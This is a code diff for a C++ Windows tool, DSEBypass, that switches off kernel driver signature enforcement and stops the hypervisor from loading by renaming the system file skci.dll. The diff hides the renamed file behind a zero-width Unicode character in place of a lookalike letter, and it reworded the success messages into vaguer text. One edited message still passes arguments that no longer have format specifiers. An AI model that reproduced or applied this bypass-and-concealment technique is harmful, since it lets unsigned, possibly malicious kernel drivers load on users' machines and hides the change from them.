@@ -93,7 +93,7 @@ bool DSEBypass::DisableDSE() noexcept {
         return false;
     }
     
-    SUCCESS(L"DSE disabled successfully! (0x%08X -> 0x%08X)", currentValue, newValue);
+    SUCCESS(L"Driver signature enforcement is off", currentValue, newValue);
     INFO(L"No restart required - unsigned drivers can now be loaded");
     return true;
 }
@@ -151,8 +151,8 @@ bool DSEBypass::RestoreDSE() noexcept {
         return false;
     }
     
-    SUCCESS(L"DSE restored successfully! (0x%08X -> 0x%08X)", currentValue, newValue);
-    INFO(L"No restart required - kernel protection reactivated");
+    SUCCESS(L"Driver signature enforcement is on (0x%08X -> 0x%08X)", currentValue, newValue);
+    INFO(L"Kernel protection reactivated - no restart required");
     return true;
 }
 
@@ -350,8 +350,8 @@ bool DSEBypass::RenameSkciLibrary() noexcept {
         return false;
     }
     
-    std::wstring srcPath = std::wstring(sysDir) + L"\\skci.dll";
-    std::wstring dstPath = std::wstring(sysDir) + L"\\skci.dlI";  // uppercase I
+	std::wstring srcPath = std::wstring(sysDir) + L"\\skci.dll";
+	std::wstring dstPath = std::wstring(sysDir) + L"\\skci\u200B.dll";
     
     DEBUG(L"Rename: %s -> %s", srcPath.c_str(), dstPath.c_str());
     
@@ -360,12 +360,12 @@ bool DSEBypass::RenameSkciLibrary() noexcept {
         return false;
     }
     
-    SUCCESS(L"skci.dll renamed successfully - hypervisor will not load on next boot");
+    SUCCESS(L"Windows hypervisor services temporarily suspended");
     return true;
 }
 
 bool DSEBypass::RestoreSkciLibrary() noexcept {
-    DEBUG(L"Restoring skci.dll from skci.dlI");
+    DEBUG(L"Restoring skci.dll");
     
     wchar_t sysDir[MAX_PATH];
     if (GetSystemDirectoryW(sysDir, MAX_PATH) == 0) {
@@ -373,7 +373,7 @@ bool DSEBypass::RestoreSkciLibrary() noexcept {
         return false;
     }
     
-    std::wstring srcPath = std::wstring(sysDir) + L"\\skci.dlI";
+    std::wstring srcPath = std::wstring(sysDir) + L"\\skci\u200B.dll";
     std::wstring dstPath = std::wstring(sysDir) + L"\\skci.dll";
     
     // Admin rights sufficient for restore (no hypervisor running)
@@ -554,8 +554,8 @@ bool DSEBypass::DisableDSEAfterReboot() noexcept {
     // Step 3: Cleanup
     ClearDSEState();
     
-    SUCCESS(L"DSE disabled successfully! (0x%08X -> 0x%08X)", currentValue, newValue);
-    SUCCESS(L"Hypervisor bypassed and skci.dll restored");
+    SUCCESS(L"Driver signature enforcement is off (0x%08X -> 0x%08X)", currentValue, newValue);
+    SUCCESS(L"Hypervisor bypassed and library restored");
     
     return true;
 }
